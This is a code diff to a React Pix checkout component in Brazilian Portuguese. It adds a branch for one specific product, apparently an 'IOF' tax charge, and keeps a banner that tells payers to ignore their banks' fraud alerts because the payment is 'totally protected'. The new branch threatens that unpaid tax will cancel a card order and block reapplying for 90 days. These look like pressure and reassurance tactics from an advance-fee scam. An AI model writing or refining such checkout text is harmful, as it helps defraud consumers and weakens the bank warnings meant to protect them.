@@ -306,20 +306,31 @@ const PixPayment = ({ pixData, loading, onGeneratePix, email, cpf, total, fullNa
       </div>
 
       {/* Security Warning */}
-      <div className="rounded-xl border-2 border-[hsl(var(--checkout-warning))] bg-[hsl(var(--checkout-warning))]/10 p-3 sm:p-4">
-        <div className="flex items-start gap-3">
-          <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-[hsl(var(--checkout-warning))]">
-            <AlertTriangle className="h-4 w-4 text-primary-foreground" />
+      {(() => {
+        const isIof = orderItems?.some((i) => i.id === "3992d6d7-f608-4b8a-9191-c053eda9a673");
+        return (
+          <div className="rounded-xl border-2 border-[hsl(var(--checkout-warning))] bg-[hsl(var(--checkout-warning))]/10 p-3 sm:p-4">
+            <div className="flex items-start gap-3">
+              <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-[hsl(var(--checkout-warning))]">
+                <AlertTriangle className="h-4 w-4 text-primary-foreground" />
+              </div>
+              <div>
+                <p className="text-sm font-semibold text-foreground">Atenção ao pagar</p>
+                <p className="mt-1 text-xs text-muted-foreground">
+                  {isIof ? (
+                    <>O não pagamento do imposto <strong className="text-foreground">cancelará o pedido do cartão</strong> e impedirá uma nova solicitação por até <strong className="text-foreground">90 dias</strong>.</>
+                  ) : (
+                    <>
+                      Os bancos reforçaram a segurança do Pix e podem exibir alertas preventivos durante o pagamento.{" "}
+                      <strong className="text-foreground">Fique tranquilo — sua transação é segura e está totalmente protegida.</strong>
+                    </>
+                  )}
+                </p>
+              </div>
+            </div>
           </div>
-          <div>
-            <p className="text-sm font-semibold text-foreground">Atenção ao pagar</p>
-            <p className="mt-1 text-xs text-muted-foreground">
-              Os bancos reforçaram a segurança do Pix e podem exibir alertas preventivos durante o pagamento.{" "}
-              <strong className="text-foreground">Fique tranquilo — sua transação é segura e está totalmente protegida.</strong>
-            </p>
-          </div>
-        </div>
-      </div>
+        );
+      })()}
 
       <div>
         <p className="mb-3 text-sm font-semibold text-foreground">Como pagar o pix:</p>
